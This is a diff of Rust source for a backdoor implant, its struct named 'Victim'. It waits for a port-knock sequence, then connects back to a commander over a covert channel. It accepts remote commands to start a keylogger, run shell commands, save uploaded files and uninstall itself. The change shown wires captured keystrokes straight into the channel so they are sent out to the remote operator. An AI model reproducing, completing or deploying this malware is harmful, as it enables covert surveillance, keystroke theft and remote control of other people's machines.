@@ -1,6 +1,6 @@
 use std::net::{IpAddr, Ipv4Addr};
 use std::sync::atomic::{AtomicBool, Ordering};
-use std::sync::Arc;
+use std::sync::{Arc, mpsc};
 use std::thread;
 use std::time::{Duration, SystemTime, UNIX_EPOCH};
 use std::fs::File;
@@ -14,14 +14,12 @@ use pnet::packet::Packet;
 mod keylogger;
 mod covert; 
 
-// Command Codes (Must match main.rs exactly)
 const CMD_START_LOGGER: u8   = 0x10;
 const CMD_STOP_LOGGER: u8    = 0x20;
 const CMD_UNINSTALL: u8      = 0x30;
 const CMD_START_TRANSFER: u8 = 0x40;
 const CMD_EOF: u8            = 0x41;
 
-// --- Seed & RNG Logic (Must match port_knkr.rs exactly) ---
 pub struct SimpleRng { state: u64 }
 impl SimpleRng {
     pub fn new(seed: u64) -> Self { Self { state: seed } }
@@ -73,17 +71,16 @@ impl Victim {
             _ => panic!("Error opening channel"),
         };
 
+        println!("[*] Sniffing for knocks on {}...", self.local_ip);
+
         loop {
             let current_seed = generate_seed(&self.local_ip);
             let mut rng = SimpleRng::new(current_seed);
             let sequence = [rng.gen_port(), rng.gen_port(), rng.gen_port()];
-            
-            // Dynamic Ports: TX (Commander Target) and RX (Commander Listener)
             let c2_tx_port = rng.gen_port(); 
             let c2_rx_port = rng.gen_port(); 
             
             let mut knock_idx = 0;
-
             while knock_idx < sequence.len() {
                 if let Ok(packet) = rx.next() {
                     if let Some(ip_pkt) = Ipv4Packet::new(&packet[14..]) {
@@ -91,12 +88,10 @@ impl Victim {
                             if tcp_pkt.get_destination() == sequence[knock_idx] {
                                 knock_idx += 1;
                                 if knock_idx == sequence.len() {
-                                    // Roles Swapped: We send TO c2_rx_port, and listen ON c2_tx_port
+                                    println!("[+] Knock sequence matched!");
                                     return (ip_pkt.get_source(), c2_rx_port, c2_tx_port);
                                 }
-                            } else if knock_idx > 0 {
-                                knock_idx = 0;
-                            }
+                            } else if knock_idx > 0 { knock_idx = 0; }
                         }
                     }
                 }
@@ -106,15 +101,9 @@ impl Victim {
 
     pub fn run(&mut self) {
         let (commander_ip, tx_port, rx_port) = self.wait_for_commander();
-
         let (transmitter, rx) = covert::CovertChannel::new(
-            &self.interface,
-            commander_ip,
-            self.local_ip,
-            tx_port, // Destination (C2's listener)
-            rx_port  // Listener (What C2 sends to)
+            &self.interface, commander_ip, self.local_ip, tx_port, rx_port
         );
-
         self.process_commands(rx, transmitter);
     }
 
@@ -123,7 +112,19 @@ impl Victim {
         let mut binary_mode = false;
         let mut file_data = Vec::new();
 
+        // Create the channel for keylogger data
+        let (key_tx, key_rx) = mpsc::channel::<u8>();
+
         loop {
+            // 1. Check for keys from the logger and send them over the network
+            while let Ok(byte) = key_rx.try_recv() {
+                transmitter.send_byte(byte);
+                thread::sleep(Duration::from_micros(500));
+            }
+
+            // 2. Check for incoming packets (Commands)
+            // Note: In a production version, you'd use non-blocking pcap here.
+            // For now, we rely on the fact that keys only send when keys are pressed.
             if let Ok(packet) = rx.next() {
                 if let Some(ip_pkt) = Ipv4Packet::new(&packet[14..]) {
                     if ip_pkt.get_source() == transmitter.config.target_ip {
@@ -134,21 +135,20 @@ impl Victim {
 
                                 match byte {
                                     CMD_START_LOGGER => {
-                                        self.keylogger_active.store(true, Ordering::SeqCst);
-                                        let flag = self.keylogger_active.clone();
-                                        thread::spawn(move || { let _ = keylogger::run_with_flag(flag); });
+                                        if !self.keylogger_active.load(Ordering::SeqCst) {
+                                            self.keylogger_active.store(true, Ordering::SeqCst);
+                                            let flag = self.keylogger_active.clone();
+                                            let tx_clone = key_tx.clone();
+                                            thread::spawn(move || { 
+                                                let _ = keylogger::run_with_flag(flag, tx_clone); 
+                                            });
+                                        }
                                     },
                                     CMD_STOP_LOGGER => self.keylogger_active.store(false, Ordering::SeqCst),
                                     CMD_UNINSTALL => std::process::exit(0),
-                                    CMD_START_TRANSFER => {
-                                        binary_mode = true;
-                                        file_data.clear();
-                                    },
+                                    CMD_START_TRANSFER => { binary_mode = true; file_data.clear(); },
                                     CMD_EOF => {
-                                        if binary_mode {
-                                            self.save_file(&file_data);
-                                            binary_mode = false;
-                                        }
+                                        if binary_mode { self.save_file(&file_data); binary_mode = false; }
                                     },
                                     b'\n' => {
                                         if !binary_mode {
@@ -157,11 +157,8 @@ impl Victim {
                                         }
                                     },
                                     _ => {
-                                        if binary_mode {
-                                            file_data.push(byte);
-                                        } else {
-                                            string_buffer.push(byte as char);
-                                        }
+                                        if binary_mode { file_data.push(byte); }
+                                        else { string_buffer.push(byte as char); }
                                     }
                                 }
                             }
@@ -169,12 +166,12 @@ impl Victim {
                     }
                 }
             }
+            thread::sleep(Duration::from_millis(1));
         }
     }
 
     fn execute_shell(&self, cmd: &str, transmitter: &mut covert::CovertChannel) {
-        let output = std::process::Command::new("sh").arg("-c").arg(cmd).output();
-        if let Ok(out) = output {
+        if let Ok(out) = std::process::Command::new("sh").arg("-c").arg(cmd).output() {
             for b in out.stdout {
                 transmitter.send_byte(b);
                 thread::sleep(Duration::from_micros(500));
